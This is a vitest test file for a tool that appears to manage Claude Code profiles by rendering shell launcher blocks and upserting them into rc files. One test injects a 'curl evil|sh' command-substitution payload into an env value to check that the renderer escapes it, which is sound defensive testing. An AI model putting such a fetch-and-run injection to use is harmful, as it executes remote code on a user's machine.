import { describe, it, expect } from 'vitest'
import { renderRcBlock, upsertManagedBlock, BEGIN_MARK, END_MARK } from '../src/rcblock.js'
import { detectPlatform } from '../src/platform.js'
import type { Manifest } from '../src/manifest.js'

const m: Manifest = {
  version: 1, hub: null,
  profiles: [
    { name: 'default', dir: '{home}/.claude', launcher: null, auth: 'oauth', env: {}, links: {}, mcp: [] },
    { name: 'z', dir: '{home}/.claude-z', launcher: 'cl-z', auth: 'env',
      env: { ANTHROPIC_AUTH_TOKEN: 'secret://z-token', ANTHROPIC_BASE_URL: 'https://api.z.ai/api/anthropic' },
      links: {}, mcp: [] },
  ],
  mcpServers: {},
}
const mac = detectPlatform({ osKind: 'darwin', home: '/Users/x', shell: '/bin/zsh' })
const win = detectPlatform({ osKind: 'win32', home: 'C:\\Users\\x' })

describe('renderRcBlock', () => {
  it('renders posix launchers with secret indirection, skips null launchers', () => {
    const block = renderRcBlock(m, mac)
    expect(block).toContain(BEGIN_MARK)
    expect(block).toContain('cl-z() {')
    expect(block).toContain('export ANTHROPIC_AUTH_TOKEN="$(ccprofiles secrets get z-token)"')
    expect(block).toContain('export ANTHROPIC_BASE_URL="https://api.z.ai/api/anthropic"')
    expect(block).toContain('CLAUDE_CONFIG_DIR="$HOME/.claude-z" claude "$@"')
    expect(block).not.toContain('cl-default')
    expect(block).toContain(END_MARK)
  })
  it('renders powershell launchers on win32', () => {
    const block = renderRcBlock(m, win)
    expect(block).toContain('function cl-z {')
    expect(block).toContain('$env:ANTHROPIC_AUTH_TOKEN = (ccprofiles secrets get z-token)')
    expect(block).toContain('$env:CLAUDE_CONFIG_DIR = "$env:USERPROFILE\\.claude-z"')
    expect(block).toContain('claude @args')
  })

  it('escapes shell metacharacters in free-form env values (defense in depth)', () => {
    const evil: Manifest = {
      version: 1, hub: null,
      profiles: [{ name: 'x', dir: '{home}/.claude-x', launcher: 'cl-x', auth: 'env',
        env: { BASE: 'http://h/$(curl evil|sh)`x`"end' }, links: {}, mcp: [] }],
      mcpServers: {},
    }
    const posix = renderRcBlock(evil, mac)
    expect(posix).toContain('export BASE="http://h/\\$(curl evil|sh)\\`x\\`\\"end"')
    expect(posix).not.toContain('"$(curl evil|sh)"') // the dangerous unescaped form must not appear
    const pwsh = renderRcBlock(evil, win)
    expect(pwsh).toContain('`$(curl evil|sh)')
    expect(pwsh).toContain('`"end')
  })
})

describe('upsertManagedBlock', () => {
  it('appends when absent', () => {
    const out = upsertManagedBlock('export PATH=/x\n', `${BEGIN_MARK}\nX\n${END_MARK}`)
    expect(out).toBe(`export PATH=/x\n\n${BEGIN_MARK}\nX\n${END_MARK}\n`)
  })
  it('replaces in place when present, preserving surroundings', () => {
    const existing = `before\n${BEGIN_MARK}\nOLD\n${END_MARK}\nafter\n`
    const out = upsertManagedBlock(existing, `${BEGIN_MARK}\nNEW\n${END_MARK}`)
    expect(out).toBe(`before\n${BEGIN_MARK}\nNEW\n${END_MARK}\nafter\n`)
  })
})
